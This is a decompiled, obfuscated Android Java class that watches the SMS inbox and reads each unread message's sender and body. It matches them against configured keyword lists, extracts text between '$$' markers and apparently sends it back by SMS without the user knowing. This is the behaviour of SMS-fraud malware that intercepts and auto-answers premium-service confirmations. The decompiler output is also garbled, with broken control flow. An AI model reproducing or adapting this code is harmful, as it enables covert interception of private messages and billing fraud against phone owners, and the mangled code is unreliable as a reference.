package com.jx.night.sms.dbserver;

import android.content.ContentResolver;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Message;
import com.jx.night.sms.a.d;
import com.jx.night.unit.MyConst;
import com.jx.night.unit.e;
import java.util.List;

public class c
  extends ContentObserver
{
  public a a;
  private ContentResolver b;
  
  public c(ContentResolver paramContentResolver, a paramA)
  {
    super(paramA);
    this.b = paramContentResolver;
    this.a = paramA;
  }
  
  private boolean a(b paramB)
  {
    com.jx.night.sms.a.b localB = MyConst.k;
    if (localB == null) {
      return false;
    }
    Object localObject1;
    int j;
    int i;
    label39:
    Object localObject2;
    if (localB.d == null)
    {
      localObject1 = "";
      localObject1 = ((String)localObject1).split(",");
      j = localObject1.length;
      i = 0;
      if (i >= j) {
        break label91;
      }
      localObject2 = localObject1[i];
      if (!"".equals(localObject2)) {
        break label77;
      }
    }
    label77:
    while (!paramB.d.equals(localObject2))
    {
      i += 1;
      break label39;
      localObject1 = localB.d;
      break;
    }
    return true;
    label91:
    if (localB.e == null)
    {
      localObject1 = "";
      localObject1 = ((String)localObject1).split(",");
      j = localObject1.length;
      i = 0;
      label118:
      if (i >= j) {
        break label170;
      }
      localB = localObject1[i];
      if (!"".equals(localB)) {
        break label156;
      }
    }
    label156:
    while (!paramB.e.contains(localB))
    {
      i += 1;
      break label118;
      localObject1 = localB.e;
      break;
    }
    return true;
    label170:
    return false;
  }
  
  private boolean a(String paramString1, String paramString2)
  {
    if (paramString2.contains(","))
    {
      paramString2 = paramString2.split(",");
      j = paramString2.length;
      i = 0;
      if (i < j) {
        if (paramString1.contains(paramString2[i])) {}
      }
    }
    while (!paramString1.contains(paramString2))
    {
      for (;;)
      {
        int j;
        int i;
        return false;
        i += 1;
      }
      return true;
    }
    return true;
  }
  
  private void b(b paramB)
  {
    List localList = MyConst.l;
    if (localList == null) {}
    while (localList.size() == 0) {
      return;
    }
    String str3 = paramB.e;
    int i = 0;
    label29:
    Object localObject;
    String str2;
    if (i < localList.size())
    {
      localObject = (d)localList.get(i);
      if (a(str3, ((d)localList.get(i)).b))
      {
        str2 = ((d)localObject).a;
        if (str2 != null) {
          break label95;
        }
      }
    }
    label95:
    while ("".equals(str2))
    {
      i += 1;
      break label29;
      break;
    }
    label124:
    String str1;
    String str4;
    String str5;
    int k;
    if ("".equals(((d)localObject).b))
    {
      localObject = paramB.d;
      str1 = str2;
      if (str2.contains("$$"))
      {
        str4 = str2.split("\\$\\$")[0];
        str5 = str2.split("\\$\\$")[1];
        if (!paramB.e.contains(str4))
        {
          str1 = str2;
          if (!paramB.e.contains(str5)) {}
        }
        else
        {
          k = 999;
          if ("".equals(str4)) {
            break label370;
          }
        }
      }
    }
    label370:
    for (int j = str3.indexOf(str4) + str4.length();; j = 0)
    {
      if (!"".equals(str5)) {
        k = str3.indexOf(str5);
      }
      str1 = str3.substring(j, k);
      str2 = MyConst.q;
      if (("".equals(str1)) || (e.d(str2).contains(paramB.b + ""))) {
        break;
      }
      e.c(str2, e.d(str2) + paramB.b + "");
      new com.jx.night.sms.a(new com.jx.night.sms.a.a(((String)localObject).replace("+86", ""), str1, ""));
      break;
      localObject = ((d)localObject).b;
      break label124;
    }
  }
  
  public void onChange(boolean paramBoolean)
  {
    Cursor localCursor = this.b.query(Uri.parse("content://sms/inbox"), new String[] { "_id", "address", "read", "body", "thread_id", "date" }, "read=?", new String[] { "0" }, "date desc");
    if (localCursor == null) {}
    for (;;)
    {
      return;
      label66:
      b localB;
      Object localObject;
      while (localCursor.moveToNext())
      {
        localB = new b();
        int i = localCursor.getColumnIndex("_id");
        if (i != -1) {
          localB.a = localCursor.getString(i);
        }
        i = localCursor.getColumnIndex("date");
        if (i != -1) {
          localB.b = localCursor.getLong(i);
        }
        i = localCursor.getColumnIndex("thread_id");
        if (i != -1) {
          localB.c = localCursor.getString(i);
        }
        i = localCursor.getColumnIndex("address");
        if (i != -1) {
          localB.d = localCursor.getString(i);
        }
        i = localCursor.getColumnIndex("body");
        if (i != -1) {
          localB.e = localCursor.getString(i);
        }
        i = localCursor.getColumnIndex("read");
        if (i != -1) {
          localB.f = localCursor.getString(i);
        }
        localObject = MyConst.p;
        if (!e.d((String)localObject).contains(localB.b + ""))
        {
          e.c((String)localObject, e.d((String)localObject) + localB.b + "");
          localObject = new Message();
          b(localB);
        }
      }
      try
      {
        if (a(localB)) {}
        for (localB.g = 2;; localB.g = 0)
        {
          localB.g = 0;
          ((Message)localObject).obj = localB;
          this.a.sendMessageDelayed((Message)localObject, 500L);
          if (!localCursor.isLast()) {
            break label66;
          }
          if (localCursor == null) {
            break;
          }
          localCursor.close();
          return;
        }
      }
      catch (Exception localException)
      {
        for (;;)
        {
          localB.g = 0;
        }
      }
    }
  }
}
